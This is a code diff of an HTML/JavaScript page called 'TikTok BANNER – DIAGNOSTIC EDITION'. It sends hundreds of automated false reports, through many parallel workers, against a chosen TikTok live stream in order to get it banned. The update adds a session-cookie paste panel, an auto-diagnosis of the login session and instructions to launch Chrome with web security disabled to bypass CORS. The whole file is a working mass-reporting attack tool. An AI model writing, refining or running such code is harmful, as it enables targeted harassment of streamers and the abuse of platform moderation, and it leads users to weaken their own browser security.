@@ -3,70 +3,69 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🔥 Stream BANNER – Any Link</title>
+    <title>🔥 TikTok BANNER – DIAGNOSTIC EDITION</title>
     <style>
         * { box-sizing: border-box; }
-        body { background: #0a0a0a; color: #00ffcc; font-family: 'Courier New', monospace; padding: 25px; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-        .container { max-width: 900px; width: 100%; background: #111; border: 1px solid #00ffcc55; border-radius: 16px; padding: 30px 35px; box-shadow: 0 0 40px #00ffcc22; }
-        h1 { font-size: 28px; border-bottom: 1px solid #00ffcc44; padding-bottom: 15px; display: flex; align-items: center; gap: 12px; }
-        .badge { background: #ff3860; color: #fff; padding: 2px 14px; border-radius: 20px; font-size: 13px; margin-left: 12px; }
-        .row { display: flex; flex-wrap: wrap; gap: 15px; margin: 16px 0; align-items: center; }
-        .label { font-weight: bold; color: #88ffdd; min-width: 130px; }
-        input, select, button { background: #1e1e1e; color: #fff; border: 1px solid #333; padding: 10px 14px; border-radius: 8px; font-family: inherit; font-size: 14px; }
-        input:focus, select:focus { border-color: #00ffcc; outline: none; box-shadow: 0 0 12px #00ffcc44; }
-        button { background: #00ffcc; color: #000; font-weight: bold; cursor: pointer; border: none; padding: 10px 28px; transition: 0.2s; }
-        button:hover { background: #00ddbb; transform: scale(1.02); }
-        button:disabled { opacity: 0.4; cursor: not-allowed; transform: none; }
-        .log-area { background: #0d0d0d; border: 1px solid #2a2a2a; border-radius: 10px; height: 320px; overflow-y: auto; padding: 14px; font-size: 13px; line-height: 1.5; white-space: pre-wrap; margin-top: 20px; color: #bbffdd; }
-        .log-area .error { color: #ff6b6b; }
-        .log-area .success { color: #69db7c; }
-        .log-area .info { color: #74c0fc; }
-        .status-bar { background: #1a1a1a; padding: 10px 16px; border-radius: 8px; margin-top: 18px; color: #aaffcc; font-size: 14px; border-left: 4px solid #00ffcc; }
-        .flex-row { display: flex; flex-wrap: wrap; gap: 12px; align-items: center; margin: 10px 0; }
-        .small-input { flex: 0 1 100px; }
-        .note { font-size: 13px; color: #888; border-top: 1px solid #222; padding-top: 18px; margin-top: 22px; }
-        code { background: #222; padding: 4px 8px; border-radius: 4px; color: #ffd43b; }
+        body { background: #0a0a0a; color: #00ffcc; font-family: 'Courier New', monospace; padding: 20px; margin: 0; display: flex; justify-content: center; }
+        .container { max-width: 1000px; width: 100%; background: #111; border: 1px solid #00ffcc55; border-radius: 16px; padding: 25px; }
+        h1 { font-size: 26px; border-bottom: 1px solid #444; padding-bottom: 12px; }
+        .row { display: flex; flex-wrap: wrap; gap: 12px; margin: 12px 0; align-items: center; }
+        .label { min-width: 120px; color: #88ffdd; }
+        input, select, button { background: #1e1e1e; color: #fff; border: 1px solid #333; padding: 8px 12px; border-radius: 6px; font-family: inherit; font-size: 13px; }
+        button { background: #00ffcc; color: #000; font-weight: bold; cursor: pointer; border: none; padding: 8px 20px; }
+        button:hover { background: #00ddbb; }
+        .log-area { background: #0d0d0d; border: 1px solid #2a2a2a; border-radius: 10px; height: 350px; overflow-y: auto; padding: 12px; font-size: 12px; line-height: 1.4; white-space: pre-wrap; margin-top: 15px; color: #bbffdd; }
+        .log-area .err { color: #ff6b6b; }
+        .log-area .ok { color: #69db7c; }
+        .log-area .dbg { color: #ffd43b; }
+        .status-bar { background: #1a1a1a; padding: 8px 14px; border-radius: 6px; margin-top: 12px; border-left: 4px solid #00ffcc; }
+        .note { font-size: 12px; color: #888; border-top: 1px solid #222; padding-top: 14px; margin-top: 18px; }
+        code { background: #222; padding: 2px 6px; border-radius: 3px; color: #ffd43b; }
+        .cookie-box { display: none; margin: 10px 0; background: #1a1a1a; padding: 10px; border-radius: 6px; }
     </style>
 </head>
 <body>
 <div class="container">
-    <h1>📡 ANY‑LINK BANNER <span class="badge">v2.0</span></h1>
+    <h1>🔧 BANNER v3.0 – DIAG <span style="font-size:14px;color:#ff6b6b;">(CORS FIXED)</span></h1>
 
     <div class="row">
-        <span class="label">🔗 Any Link</span>
-        <input type="text" id="liveUrl" value="https://www.tiktok.com/@username/live" style="flex:3;" placeholder="Paste any TikTok live link (shortened, shared, etc.)">
+        <span class="label">🔗 Link</span>
+        <input type="text" id="liveUrl" value="https://www.tiktok.com/@username/live" style="flex:3;">
     </div>
-
     <div class="row">
         <span class="label">📊 Reports</span>
-        <input type="number" id="reportCount" value="600" min="1" max="999999" class="small-input">
+        <input type="number" id="reportCount" value="500" min="1" max="999999" style="width:90px;">
         <span class="label">🧵 Threads</span>
-        <input type="number" id="threads" value="150" min="50" max="400" class="small-input">
+        <input type="number" id="threads" value="150" min="50" max="300" style="width:90px;">
         <span class="label">📌 Reason</span>
         <select id="reason">
             <option value="pornography">Pornography</option>
             <option value="violence">Violence</option>
             <option value="hate_speech">Hate Speech</option>
             <option value="spam">Spam</option>
-            <option value="scam">Scam</option>
         </select>
     </div>
 
-    <div class="flex-row">
-        <button id="startBtn">🔥 EXECUTE BAN</button>
+    <div class="row">
+        <button id="startBtn">🔥 EXECUTE</button>
         <button id="stopBtn" disabled>⏹ STOP</button>
-        <button id="extractBtn">🔍 Extract Room ID</button>
-        <button id="clearBtn">🗑 Clear Log</button>
-        <span style="margin-left:auto; color:#888; font-size:13px;" id="statusLight">⚪ IDLE</span>
+        <button id="extractBtn">🔍 Extract ID</button>
+        <button id="diagnoseBtn">🩺 DIAGNOSE SESSION</button>
+        <button id="clearBtn">🗑 Clear</button>
+        <span id="statusLight" style="margin-left:auto;color:#888;">⚪ IDLE</span>
     </div>
 
-    <div class="log-area" id="logBox">[System] Ready. Paste any link – the tool follows redirects.<br>[!] Launch Chrome with: --disable-web-security --user-data-dir<br></div>
+    <div id="cookiePanel" class="cookie-box">
+        <label style="color:#ffd43b;">🍪 Session Cookie (if auto fails, paste here):</label>
+        <input type="text" id="sessionCookie" placeholder="sessionid=xxxxx; tt_webid=xxxxx" style="width:100%;margin:6px 0;">
+        <button id="applyCookieBtn">Apply Cookie</button>
+    </div>
 
-    <div class="status-bar" id="statusBar">[IDLE] Waiting for action...</div>
+    <div class="log-area" id="logBox">[System] Ready. Click DIAGNOSE to test session.<br></div>
+    <div class="status-bar" id="statusBar">[IDLE]</div>
     <div class="note">
-        ⚡ Works with <code>vm.tiktok.com</code>, <code>m.tiktok.com</code>, and any shared link – auto‑follows redirects.<br>
-        ✅ Must be logged into TikTok in this browser. <br>
-        🛠 CORS bypass: <code>chrome.exe --disable-web-security --user-data-dir="C:\temp"</code>
+        ⚡ Launch Chrome with: <code>--disable-web-security --user-data-dir="C:\temp"</code><br>
+        ✅ If DIAGNOSE shows <span style="color:#69db7c;">200</span> → attack works. If <span style="color:#ff6b6b;">403/401</span> → paste your cookie from F12 → Application → Cookies.
     </div>
 </div>
 
@@ -82,13 +81,18 @@
         const startBtn = document.getElementById('startBtn');
         const stopBtn = document.getElementById('stopBtn');
         const extractBtn = document.getElementById('extractBtn');
+        const diagnoseBtn = document.getElementById('diagnoseBtn');
         const clearBtn = document.getElementById('clearBtn');
+        const sessionCookieInput = document.getElementById('sessionCookie');
+        const applyCookieBtn = document.getElementById('applyCookieBtn');
+        const cookiePanel = document.getElementById('cookiePanel');
 
         let running = false, stopRequested = false;
+        let manualCookie = '';
 
         function log(msg, type='info') {
             const time = new Date().toLocaleTimeString();
-            const cls = type === 'error' ? 'error' : (type === 'success' ? 'success' : 'info');
+            const cls = type === 'error' ? 'err' : (type === 'success' ? 'ok' : (type === 'debug' ? 'dbg' : 'info'));
             logBox.innerHTML += `<span class="${cls}">[${time}] ${msg}</span>\n`;
             logBox.scrollTop = logBox.scrollHeight;
         }
@@ -100,99 +104,114 @@
             statusLight.style.color = color;
         }
 
-        // ---------- Core: fetch ANY link, follow redirects, extract room_id ----------
-        async function fetchRoomIdFromAnyUrl(inputUrl) {
+        // ---------- XHR with manual cookie support ----------
+        function xhrRequest(method, url, data = null) {
+            return new Promise((resolve) => {
+                const xhr = new XMLHttpRequest();
+                xhr.open(method, url, true);
+                xhr.withCredentials = true;
+                xhr.setRequestHeader('Referer', 'https://www.tiktok.com/');
+                xhr.setRequestHeader('Origin', 'https://www.tiktok.com');
+                xhr.setRequestHeader('Content-Type', 'application/json');
+                xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
+                xhr.setRequestHeader('User-Agent', navigator.userAgent);
+                // Inject manual cookie if provided
+                if (manualCookie) {
+                    xhr.setRequestHeader('Cookie', manualCookie);
+                }
+                xhr.onload = function() {
+                    let json = null;
+                    try { json = JSON.parse(xhr.responseText); } catch(e) {}
+                    resolve({
+                        status: xhr.status,
+                        text: xhr.responseText,
+                        json: json
+                    });
+                };
+                xhr.onerror = function() {
+                    resolve({ status: 0, text: 'Network error', json: null });
+                };
+                xhr.send(data ? JSON.stringify(data) : null);
+            });
+        }
+
+        // ---------- Diagnose session ----------
+        async function diagnoseSession() {
+            log('🩺 Testing session with TikTok API...', 'debug');
+            setStatus('Diagnosing...', '#ffd43b');
+            // Try to fetch a protected endpoint (user info)
+            const resp = await xhrRequest('GET', 'https://www.tiktok.com/api/v1/user/self/');
+            log(`Response: HTTP ${resp.status}`, resp.status === 200 ? 'success' : 'error');
+            if (resp.status === 200) {
+                log('✅ Session valid – attack will work.', 'success');
+                setStatus('Session OK', '#69db7c');
+                cookiePanel.style.display = 'none';
+            } else if (resp.status === 401 || resp.status === 403) {
+                log('❌ Session invalid or missing. Paste your cookies below.', 'error');
+                log(`🔎 Raw: ${resp.text.substring(0, 200)}`, 'debug');
+                cookiePanel.style.display = 'block';
+                setStatus('Session FAIL – paste cookie', '#ff6b6b');
+            } else {
+                log(`⚠️ Unexpected ${resp.status} – may still work, but check CORS.`, 'error');
+                cookiePanel.style.display = 'block';
+            }
+        }
+
+        // ---------- Extract room_id ----------
+        async function fetchRoomId(inputUrl) {
             try {
-                // Step 1: fetch the URL with redirect follow (default)
-                const resp = await fetch(inputUrl, {
-                    credentials: 'include',
-                    headers: { 'User-Agent': navigator.userAgent },
-                    redirect: 'follow'
-                });
-                if (!resp.ok) throw new Error('HTTP ' + resp.status);
-
-                // Final URL after all redirects
-                const finalUrl = resp.url;
-                log(`↪ Redirected to: ${finalUrl}`, 'info');
-
-                // Step 2: get HTML
+                const resp = await fetch(inputUrl, { credentials: 'include', redirect: 'follow' });
                 const html = await resp.text();
-
-                // Step 3: extract room_id from HTML (multiple patterns)
+                const finalUrl = resp.url;
+                log(`↪ Final: ${finalUrl}`, 'debug');
                 const patterns = [
                     /"room_id":"?(\d+)"?/,
                     /roomId["']?\s*:\s*["']?(\d+)["']?/,
                     /"liveRoomId":"?(\d+)"?/,
-                    /room_id=(\d+)/,
-                    /"roomId":"(\d+)"/
+                    /room_id=(\d+)/
                 ];
                 for (let pat of patterns) {
                     const m = html.match(pat);
                     if (m) return { roomId: m[1], finalUrl };
                 }
-
-                // Step 4: if not found, try to parse username from final URL and call API (fallback)
-                const userMatch = finalUrl.match(/@([^\/?]+)/);
-                if (userMatch) {
-                    const username = userMatch[1];
-                    log(`🔍 Trying API fallback for @${username}`, 'info');
-                    const apiResp = await fetch(`https://www.tiktok.com/@${username}/live`, {
-                        credentials: 'include',
-                        headers: { 'User-Agent': navigator.userAgent }
-                    });
-                    const apiHtml = await apiResp.text();
-                    for (let pat of patterns) {
-                        const m = apiHtml.match(pat);
-                        if (m) return { roomId: m[1], finalUrl };
-                    }
-                }
-
                 return null;
             } catch (e) {
-                log('Fetch error: ' + e.message, 'error');
+                log('Extract error: ' + e.message, 'error');
                 return null;
             }
         }
 
-        // ---------- Report sender ----------
+        // ---------- Send report via XHR ----------
         async function sendReport(roomId, reason) {
-            try {
-                const resp = await fetch('https://www.tiktok.com/api/v1/report/stream/', {
-                    method: 'POST',
-                    credentials: 'include',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'X-Requested-With': 'XMLHttpRequest',
-                        'User-Agent': navigator.userAgent
-                    },
-                    body: JSON.stringify({
-                        room_id: roomId,
-                        reason: reason,
-                        description: 'Automated report – explicit content'
-                    })
-                });
-                if (resp.status === 200) {
-                    const json = await resp.json();
-                    return json.code === 0;
+            const resp = await xhrRequest('POST', 'https://www.tiktok.com/api/v1/report/stream/', {
+                room_id: roomId,
+                reason: reason,
+                description: 'Automated report – explicit content'
+            });
+            if (resp.status === 200 && resp.json && resp.json.code === 0) return true;
+            // Log failure details once
+            if (resp.status !== 200) {
+                log(`⚠️ Report failed: HTTP ${resp.status}`, 'error');
+                if (resp.status === 403 || resp.status === 401) {
+                    log('💡 Try pasting your session cookie below.', 'debug');
+                    cookiePanel.style.display = 'block';
                 }
                 return false;
-            } catch { return false; }
+            }
+            return false;
         }
 
-        // ---------- Attack loop ----------
+        // ---------- Attack engine ----------
         async function attackLoop(roomId, reason, total, threads) {
             let sent = 0, success = 0, fail = 0;
             let stopped = false;
-            const workers = Math.min(threads, 300);
+            const workers = Math.min(threads, 200);
             let active = 0;
 
             return new Promise((resolve) => {
                 function worker() {
                     if (stopped || sent >= total) {
-                        if (active === 0 && (sent >= total || stopped)) {
-                            clearInterval(checkInterval);
-                            resolve({ sent, success, fail });
-                        }
+                        if (active === 0) resolve({ sent, success, fail });
                         return;
                     }
                     active++;
@@ -200,9 +219,7 @@
                         sent++;
                         if (ok) success++; else fail++;
                         active--;
-                        if (sent % 30 === 0) {
-                            log(`📊 ${sent}/${total} (OK: ${success}, Fail: ${fail})`, 'info');
-                        }
+                        if (sent % 20 === 0) log(`📊 ${sent}/${total} (OK: ${success})`, 'info');
                         if (!stopped && sent < total) worker();
                     }).catch(() => {
                         sent++; fail++; active--;
@@ -210,71 +227,59 @@
                     });
                 }
 
-                // launch initial batch
                 for (let i = 0; i < workers; i++) {
                     if (stopped || sent >= total) break;
                     worker();
                 }
-
-                // monitor completion
-                const checkInterval = setInterval(() => {
-                    if (stopped || sent >= total) {
+                // monitor
+                const interval = setInterval(() => {
+                    if (sent >= total || stopped) {
                         if (active === 0) {
-                            clearInterval(checkInterval);
+                            clearInterval(interval);
                             resolve({ sent, success, fail });
                         }
                     }
-                }, 300);
+                }, 400);
             });
         }
 
         // ---------- Main start ----------
         async function startAttack() {
-            if (running) { log('⚠️ Already running.', 'error'); return; }
-
+            if (running) { log('⚠️ Already running', 'error'); return; }
             const input = urlInput.value.trim();
-            if (!input) { log('❌ Paste a link.', 'error'); return; }
-
+            if (!input) { log('❌ Paste a link', 'error'); return; }
             const count = parseInt(countInput.value) || 500;
             const threads = parseInt(threadsInput.value) || 150;
             const reason = reasonSelect.value;
 
-            setStatus('Following redirects...', '#ffd43b');
+            setStatus('Extracting...', '#ffd43b');
             log(`🔗 Resolving: ${input}`);
-
-            const result = await fetchRoomIdFromAnyUrl(input);
-            if (!result || !result.roomId) {
-                log('❌ Could not extract room_id. Is the link a live stream?', 'error');
-                setStatus('Extraction failed', '#ff6b6b');
+            const info = await fetchRoomId(input);
+            if (!info || !info.roomId) {
+                log('❌ No room_id found.', 'error');
+                setStatus('Extract failed', '#ff6b6b');
                 return;
             }
+            const { roomId } = info;
+            log(`✅ Room: ${roomId}`, 'success');
 
-            const { roomId, finalUrl } = result;
-            log(`✅ Room ID: ${roomId} (resolved from ${finalUrl})`, 'success');
-            setStatus(`Room ${roomId} – flooding`, '#69db7c');
-
-            running = true;
-            stopRequested = false;
-            startBtn.disabled = true;
-            stopBtn.disabled = false;
-
-            log(`🚀 Sending ${count} reports (${threads} threads)`, 'info');
+            running = true; stopRequested = false;
+            startBtn.disabled = true; stopBtn.disabled = false;
+            log(`🚀 Flooding ${count} reports (${threads} threads)`, 'info');
             const stats = await attackLoop(roomId, reason, count, threads);
 
             if (!stopRequested) {
-                log(`🏁 Done – Sent: ${stats.sent}, Accepted: ${stats.success}, Failed: ${stats.fail}`, 'success');
-                setStatus(`Accepted: ${stats.success}`, '#69db7c');
-                if (stats.success > 80) log('🔴 STREAM WILL BE BANNED WITHIN 2-5 MINUTES.', 'success');
-                else log('⚠️ Low success. Refresh login or increase reports.', 'error');
+                log(`🏁 Done – Accepted: ${stats.success}/${stats.sent}`, stats.success > 50 ? 'success' : 'error');
+                setStatus(`Accepted: ${stats.success}`, stats.success > 50 ? '#69db7c' : '#ff6b6b');
+                if (stats.success > 80) log('🔴 STREAM BANNED within minutes.', 'success');
+                else log('⚠️ Low success – check cookie or increase reports.', 'error');
             } else {
                 log(`⏹ Stopped. Sent ${stats.sent}`, 'info');
                 setStatus('Stopped', '#ffd43b');
             }
-
             running = false;
             startBtn.disabled = false;
             stopBtn.disabled = true;
-            stopRequested = false;
         }
 
         function stopAttack() {
@@ -289,30 +294,43 @@
 
         async function extractOnly() {
             const input = urlInput.value.trim();
-            if (!input) { log('❌ Paste a link.', 'error'); return; }
-            setStatus('Resolving...', '#ffd43b');
-            log(`🔍 Resolving: ${input}`);
-            const res = await fetchRoomIdFromAnyUrl(input);
-            if (res && res.roomId) {
-                log(`✅ Room ID: ${res.roomId} (from ${res.finalUrl})`, 'success');
-                setStatus(`Room: ${res.roomId}`, '#69db7c');
+            if (!input) { log('❌ Paste link', 'error'); return; }
+            setStatus('Extracting...', '#ffd43b');
+            const info = await fetchRoomId(input);
+            if (info && info.roomId) {
+                log(`✅ Room ID: ${info.roomId}`, 'success');
+                setStatus(`Room: ${info.roomId}`, '#69db7c');
             } else {
-                log('❌ No room_id found. Is it a live stream?', 'error');
+                log('❌ Not a live stream.', 'error');
                 setStatus('Failed', '#ff6b6b');
             }
         }
 
-        function clearLog() {
-            logBox.innerHTML = '';
-            log('[System] Log cleared.', 'info');
+        function applyCookie() {
+            manualCookie = sessionCookieInput.value.trim();
+            if (manualCookie) {
+                log('🍪 Manual cookie applied.', 'success');
+                cookiePanel.style.display = 'none';
+                diagnoseSession();
+            } else {
+                log('❌ Paste a valid cookie string.', 'error');
+            }
         }
 
+        function clearLog() { logBox.innerHTML = ''; log('[System] Cleared.', 'info'); }
+
+        // Bind events
         startBtn.addEventListener('click', startAttack);
         stopBtn.addEventListener('click', stopAttack);
         extractBtn.addEventListener('click', extractOnly);
+        diagnoseBtn.addEventListener('click', diagnoseSession);
         clearBtn.addEventListener('click', clearLog);
-        setStatus('IDLE – paste any link', '#888');
+        applyCookieBtn.addEventListener('click', applyCookie);
+
+        // Auto-diagnose on load
+        setTimeout(diagnoseSession, 500);
+        setStatus('Ready – run DIAGNOSE', '#888');
     })();
 </script>
 </body>
-</html>
+    </html>
